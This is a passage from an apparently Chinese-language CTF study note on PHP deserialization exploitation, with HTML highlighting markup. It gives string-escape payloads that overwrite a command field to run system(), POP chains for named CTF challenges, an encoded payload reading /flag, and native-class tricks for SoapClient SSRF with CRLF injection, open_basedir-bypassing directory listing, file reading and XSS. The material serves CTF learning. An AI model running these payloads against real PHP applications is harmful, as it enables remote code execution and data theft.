class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad;s:4:&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span></span><br><span class="line">&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">88</span>:<span class="string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span> <span class="comment">//bad变成good，达成了88长度，后面成为序列化后的类内容</span></span><br><span class="line">    ;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;ls&quot;</span>;&#125; <span class="comment">//序列化后的类结束位置，后面废弃</span></span><br><span class="line"><span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>减少(一般有两个变量传入点)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;good&quot;</span>,<span class="string">&quot;bad&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))); </span><br></pre></td></tr></table></figure>

<p>计算多余的字符串，添加相同数目的可替换字符串，把原来的字符串吞掉改成新值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str_o</span>=<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#x27;</span>; <span class="comment">//要吞掉的值</span></span><br><span class="line"><span class="variable">$str_e</span> = <span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span>; <span class="comment">//新增的值</span></span><br><span class="line"><span class="variable">$len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$str_o</span>);</span><br><span class="line"><span class="variable">$extra</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;good&#x27;</span>,<span class="variable">$len</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span> = <span class="variable">$extra</span>.<span class="variable">$str_o</span>.<span class="variable">$str_e</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:104:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">104</span>:<span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;<span class="string">&quot;//原本的cmd值成为key的值</span></span><br><span class="line"><span class="string">;s:3:&quot;</span>cmd<span class="string">&quot;;s:2:&quot;</span>ls<span class="string">&quot;;&#125; //实际的cmd值</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>注：除了可以把变量值替换成字符串，也可以换成某个类</p>
<p>例：2023巅峰极客-unserialize</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line">			<span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);  <span class="comment">//</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要触发pull_it,但是我们只能对root和pwd动手脚,所以就想到覆盖pwd原有值,把pwd变成pull_it类的序列化字符串</p>
<p>注意私有类有<code>/0</code>前缀,最好使用url编码</p>
<p>(因为直接赋值会变成简单的字符串,而不会被反序列化)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:12:&quot;push_itpwd&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A22%3A%22(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);%22%3B%7D</span><br></pre></td></tr></table></figure>



<h2 id="php原生类："><a href="#php原生类：" class="headerlink" title="php原生类："></a>php原生类：</h2><ul>
<li>用法:反序列化无pop链</li>
</ul>
<h3 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h3><p>reflectionfunction-&gt;invoke方法相当于call_user_func(),可以把第一个参数当作函数调用,第二个参数当作变量(可以不存在)</p>
<p>Litctf2025-君の名は</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然文中是private，但是可以改成public构造pop链（疑似7.1后特性）</p>
<p><code>__call($func,$args)</code>的传参问题:</p>
<p>假如我们触发<code>__call($func,$args)</code>调用的函数是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag(<span class="variable">$arg1</span>,<span class="variable">$arg2</span>)</span><br></pre></td></tr></table></figure>

<p>那么触发<code>__call($func,$args)</code>时<code>$func</code>就会被赋值为”flag”;<code>$args</code>就会被赋值为flag()的参数构成的数组</p>
<p>用类包装，绕过o开头：</p>
<ul>
<li>ArrayObject::unserialize</li>
<li>ArrayIterator::unserialize</li>
<li>RecursiveArrayIterator::unserialize</li>
<li>SplObjectStorage::unserialize</li>
</ul>
<p>pop如下（第二次的musubi一定要赋值，不然会报错无回显）:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new Taki();</span><br><span class="line">$a-&gt;musubi = new Mitsuha();</span><br><span class="line"></span><br><span class="line">$a-&gt;musubi-&gt;thread = new KatawareDoki();</span><br><span class="line"></span><br><span class="line">$a-&gt;musubi-&gt;thread-&gt;soul = $a;</span><br><span class="line">或者</span><br><span class="line">$a=new Taki();</span><br><span class="line">$a-&gt;musubi=new Mitsuha();</span><br><span class="line">$a-&gt;musubi-&gt;memory=new KatawareDoki();</span><br><span class="line">$a-&gt;musubi-&gt;memory-&gt;kuchikamizake=&quot;ReflectionFunction&quot;;</span><br><span class="line">$a-&gt;musubi-&gt;memory-&gt;name=&quot;\00lambda_50&quot;;</span><br><span class="line">$a-&gt;musubi-&gt;memory-&gt;soul=new Taki();</span><br><span class="line">$a-&gt;musubi-&gt;memory-&gt;soul-&gt;musubi=&#x27;time&#x27;;</span><br><span class="line">$a-&gt;musubi-&gt;memory-&gt;soul-&gt;magic=&quot;invoke&quot;;</span><br><span class="line">$aa=new Arrayobject($a);</span><br></pre></td></tr></table></figure>

<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>__call&amp;SoapClient(php5、7)</p>
<p>(<strong>SoapClient</strong>是一个专门用来访问web服务的类，可以创建soap数据报文，与wsdl接口进行交互，可以发送请求)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"><span class="comment">//第一个参数用来指明是否是wsdl模式,null就是非wsdl</span></span><br><span class="line"><span class="comment">//第二个参数是数组，wsdl此参数可选，非wsdl必须设置location和uri，前者是是发送请求的目标，后者是soap服务的目标命名空间</span></span><br><span class="line"><span class="comment">//user_agent和SOAPAction可控，可用来插入数据</span></span><br><span class="line"><span class="comment">//^^^^是换成两次crlf，后面是要传入的post数据</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//CRLF漏洞，仿照http报文</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>__toString&amp;DirectoryIterator&#x2F;FilesystemIterator&#x2F;GlobIterator</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//file:///，相当于new FilesystemIterator(&#x27;/&#x27;)</span></span><br><span class="line"><span class="comment">//glob:///*相当于new GlobIterator(&#x27;/*&#x27;);</span></span><br><span class="line"><span class="comment">//Filesystemlterator返回绝对路径，DirectoryIterator返回相对目录</span></span><br><span class="line"><span class="comment">//$files = new GlobIterator(&#x27;/path/to/directory/*.txt&#x27;);返回符合规则的文件</span></span><br><span class="line"><span class="comment">//无视open_basedir的限制</span></span><br><span class="line"><span class="comment">//不能被反序列化</span></span><br></pre></td></tr></table></figure>

<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>__toString&amp;<strong>SplFileObject</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">/*foreach($context as $f)&#123;</span></span><br><span class="line"><span class="comment">    echo($a);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//如果没有遍历的话只能读取第一行，且受到open_basedir影响</span></span><br><span class="line"><span class="comment">//可以用php伪协议(php://filter/read=convert.base64-encode/resource=flag.php)</span></span><br></pre></td></tr></table></figure>

<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>__toString&amp;Error&#x2F;Exception(开启报错,用于xss)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//exception同理且适用于php5,7,8;error仅适用于php7,8</span></span><br></pre></td></tr></table></figure>

<h3 id="获取注释内容"><a href="#获取注释内容" class="headerlink" title="获取注释内容"></a>获取注释内容</h3><p>ReflectionMethod</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="title function_ invoke__">getDocComment</span>());</span><br><span class="line"><span class="comment">//$a是对象或者方法,$b是方法</span></span><br></pre></td></tr></table></figure>

<p>参考:</p>
<p><a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a></p>
<ul>
<li><p>例：[GHCTF 2025]Popppppp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 